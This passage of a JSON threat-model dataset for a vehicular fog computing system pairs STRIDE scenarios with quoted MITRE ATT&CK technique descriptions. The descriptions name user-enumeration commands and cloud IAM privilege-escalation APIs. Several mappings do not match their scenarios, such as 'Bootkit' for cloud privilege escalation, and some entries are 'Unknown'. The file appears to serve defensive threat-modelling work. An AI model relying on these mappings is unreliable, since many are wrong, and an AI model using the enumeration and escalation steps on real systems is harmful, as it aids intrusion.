            "Potential Impact": "Disruption of local processing and decision-making, affecting vehicle operations.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "fog node",
                "traffic flooding",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud Service Overload",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are susceptible to high volumes of requests.",
                    "Role": "Cloud Services",
                    "Condition": "Lack of scalable defense mechanisms (e.g., load balancing)."
                },
                {
                    "Assumption": "An attacker can direct numerous requests to the cloud services.",
                    "Role": "Attacker",
                    "Condition": "Existence of botnets or distributed traffic sources."
                }
            ],
            "Potential Impact": "Disruption of central data processing, impacting overall VFC efficiency.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "DoS",
                "overload",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeted Vehicle Communication",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles rely on continuous communication with fog nodes.",
                    "Role": "Smart Vehicles",
                    "Condition": "Dependence on uninterrupted data flow."
                },
                {
                    "Assumption": "Attackers can block or interrupt communication channels.",
                    "Role": "Attacker",
                    "Condition": "Access and capability to disrupt wireless communications."
                }
            ],
            "Potential Impact": "Loss of real-time data processing and potentially road safety risks.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "vehicle communication",
                "wireless network",
                "interruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised Fog Node Gaining Cloud Access",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have privileges to interact with cloud services without strict access control.",
                    "Role": "Fog Nodes",
                    "Condition": "Loose access control policies."
                },
                {
                    "Assumption": "Fog node compromise extends attacker's reach.",
                    "Role": "Attacker",
                    "Condition": "Successful takeover of a fog node."
                }
            ],
            "Potential Impact": "Unauthorized access to cloud resources, potential data exfiltration, and control.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "fog node",
                "cloud access",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Vehicle to Fog Node Privilege Escalation",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles may have access to fog nodes under certain privileges.",
                    "Role": "Smart Vehicles",
                    "Condition": "Defined operational privileges within the VFC system."
                },
                {
                    "Assumption": "Attackers can exploit vehicle's access to gain higher privileges on fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of privilege escalation vulnerabilities."
                }
            ],
            "Potential Impact": "Control over fog node operations, leading to compromised traffic and data integrity.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "smart vehicle",
                "fog node",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Cloud Service Compromising VFC System",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have broad control over the VFC system.",
                    "Role": "Cloud Services",
                    "Condition": "Centralized control model for the VFC system."
                },
                {
                    "Assumption": "Attackers can gain elevated privileges on cloud services.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of cloud service vulnerabilities or credential theft."
                }
            ],
            "Potential Impact": "Full control over the VFC infrastructure, severe disruptions, or data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "cloud service",
                "VFC system",
                "control"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate vehicle's identity to gain unauthorized access to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles authenticate themselves using a unique identifier.",
                    "Role": "Vehicle",
                    "Condition": "The unique identifier can be intercepted or guessed."
                },
                {
                    "Assumption": "Fog nodes and RSUs accept data from vehicles based on the identifier without further validation.",
                    "Role": "Fog nodes or RSUs",
                    "Condition": "There's no secondary mechanism for verifying vehicle identity."
                }
            ],
            "Potential Impact": "Unauthorized access to system resources and data.",
            "MITRE ATT&CK Keywords": [
                "Identity Spoofing",
                "Network",
                "Device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a roadside unit (RSU) to alter traffic management decisions.",
            "Assumptions": [
                {
                    "Assumption": "RSUs communicate with vehicles and fog nodes without strong mutual authentication.",
                    "Role": "RSU",
                    "Condition": "Mutual authentication mechanisms are weak or not implemented."
                },
                {
                    "Assumption": "Vehicles and fog nodes accept instructions from any RSU based on appearance.",
                    "Role": "Vehicle and Fog nodes",
                    "Condition": "There are no additional checks in place for RSU legitimacy."
                }
            ],
            "Potential Impact": "Disruption of traffic flow and potential accidents.",
            "MITRE ATT&CK Keywords": [
                "Device Spoofing",
                "Traffic Management",
                "Infrastructure"
            ],
            "mitre_technique": {
                "name": "System Owner/User Discovery",
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
                "technique_id": "T1033"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof cloud service requests to download sensitive vehicle data.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes request data from cloud services using identifiable requests.",
                    "Role": "Fog nodes",
                    "Condition": "Requests can be intercepted and altered."
                },
                {
                    "Assumption": "No authentication checks are made on the origin of the data request.",
                    "Role": "Cloud Services",
                    "Condition": "Incoming requests are not adequately verified."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Service Requests",
                "Sensitive Data",
                "Data Exfiltration"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could manipulate data being uploaded from a vehicle to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted between vehicles and fog nodes is not encrypted.",
                    "Role": "Vehicle and Fog nodes",
                    "Condition": "Transmission employs plain text data or weak encryption."
                },
                {
                    "Assumption": "There are no validation checks on the data received.",
                    "Role": "Fog nodes",
                    "Condition": "Received data is not verified against known patterns or signatures."
                }
            ],
            "Potential Impact": "Incorrect vehicle data processing and decision-making.",
            "MITRE ATT&CK Keywords": [
                "Data Manipulation",
                "Local Network",
                "Data Injection"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could interfere with firmware updates sent to roadside units, injecting malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are sent over a network without encryption or proper signing.",
                    "Role": "Firmware Distribution System",
                    "Condition": "Updates are not encrypted or digitally signed."
                },
                {
                    "Assumption": "RSUs will install any received firmware update without verifying its integrity.",
                    "Role": "RSUs",
                    "Condition": "No mechanisms for integrity checks are in place."
                }
            ],
            "Potential Impact": "Compromise of RSUs and broader system malfunction.",
            "MITRE ATT&CK Keywords": [
                "Firmware Tampering",
                "Injection",
                "Device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the configuration settings of fog nodes to change their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Configuration settings are accessible and can be changed remotely without stringent controls.",
                    "Role": "Fog nodes",
                    "Condition": "Weak access controls on configuration interfaces."
                },
                {
                    "Assumption": "There are no monitoring mechanisms to detect and revert unauthorized changes.",
                    "Role": "System Monitoring",
                    "Condition": "No continuous integrity monitoring of configuration settings."
                }
            ],
            "Potential Impact": "Altered fog node functionality causing data handling and processing errors.",
            "MITRE ATT&CK Keywords": [
                "Configuration Manipulation",
                "Remote Access",
                "Data Processing"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could illicitly modify records in the cloud service and deny responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are insufficient to track detailed user activities.",
                    "Role": "Cloud Services",
                    "Condition": "Logs do not capture comprehensive user actions."
                },
                {
                    "Assumption": "There is no immutable record-keeping of data operations.",
                    "Role": "Cloud Services",
                    "Condition": "Data modifications are not logged immutably."
                }
            ],
            "Potential Impact": "Loss of data integrity and trust in data records.",
            "MITRE ATT&CK Keywords": [
                "Audit Log Manipulation",
                "Data Tampering",
                "Cloud"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--07a39029-1a46-4200-924e-a0b7f8dd0b6e",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could falsely claim a lack of involvement in generating malicious traffic data.",
            "Assumptions": [
                {
                    "Assumption": "Traffic data is not linked securely to the originating user or device.",
                    "Role": "User and Device",
                    "Condition": "Data lacks proper user attribution mechanisms."
                },
                {
                    "Assumption": "Systems rely on user-generated data tags that can be easily changed.",
                    "Role": "System",
                    "Condition": "User tags are not protected against tampering."
                }
            ],
            "Potential Impact": "Difficulty in identifying true sources of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "User Attribution",
                "Traffic Data",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system administrator could deny changes made to critical settings after a breach.",
            "Assumptions": [
                {
                    "Assumption": "Administrator actions are poorly logged or not monitored well.",
                    "Role": "Administrator",
                    "Condition": "Actions lack comprehensive logging."
                },
                {
                    "Assumption": "No multi-factor authentication is in place for changes.",
                    "Role": "System",
                    "Condition": "Weak authentication for critical changes."
                }
            ],
            "Potential Impact": "Inability to trace unauthorized changes back to the responsible party.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Administrative Actions",
                "System Monitoring"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicle data could be intercepted during transmission between fog nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between fog nodes and cloud services is not encrypted.",
                    "Role": "Fog nodes and Cloud Services",
                    "Condition": "Transmission uses insecure protocols."
                },
                {
                    "Assumption": "There is no additional layer of transmission security like VPNs or private links.",
                    "Role": "Network Design",
                    "Condition": "Lack of network layer security measures."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive vehicle data.",
            "MITRE ATT&CK Keywords": [
                "Data Interception",
                "Encrypted Communication",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit vulnerabilities in the cloud storage to access sensitive historical data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage systems have exploitable vulnerabilities.",
                    "Role": "Cloud Services",
                    "Condition": "Storage systems are not regularly patched."
                },
                {
                    "Assumption": "Access controls on cloud stored data are not enforced effectively.",
                    "Role": "System Administration",
                    "Condition": "Weak access controls or role management."
                }
            ],
            "Potential Impact": "Exposure of historic sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Cloud Storage Exploitation",
                "Access Control",
                "Data Breach"
            ],
            "mitre_technique": {
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "T1207"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leaks through compromised roadside units (RSUs) that collect and transmit data inaccurately.",
            "Assumptions": [
                {
                    "Assumption": "RSUs can be physically or remotely tampered with.",
                    "Role": "RSUs",
                    "Condition": "Weak physical and cyber security controls."
                },
                {
                    "Assumption": "Transmitted data from RSUs to fog nodes is not encrypted.",
                    "Role": "RSU and Fog Nodes",
                    "Condition": "Insecure data transmission protocols."
                }
            ],
            "Potential Impact": "Leaks of sensitive vehicle and traffic data.",
            "MITRE ATT&CK Keywords": [
                "Data Leak",
